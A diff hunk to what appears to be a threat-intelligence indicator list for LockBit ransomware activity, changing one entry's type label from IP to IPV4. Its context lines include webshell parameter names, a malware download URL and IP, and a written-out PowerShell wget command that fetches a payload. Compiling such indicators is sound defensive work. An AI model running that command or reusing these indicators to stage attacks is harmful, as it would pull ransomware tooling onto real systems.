@@ -23,5 +23,5 @@ STRING,orangenb,Eval Request parameter in webshell 689193944.aspx
 STRING,exec_code,Eval Request parameter in webshell luifdecggoqmansn.aspx
 URL,http://45.91.83.176:41361/xtOGpjcbVRwsZNCHfMDP,URL used in Powershell wget command
 STRING,powershell wget http://45.91.83.176:41361/xtOGpjcbVRwsZNCHfMDP,Powershell wget command
-IP,45.91.83.176,"IP used to download malware via Powershell wget, used by Lockbit Ransomware group"
+IPV4,45.91.83.176,"IP used to download malware via Powershell wget, used by Lockbit Ransomware group"
 DOMAIN,themoscowtimes.com,Used in ping command to check for internet connection
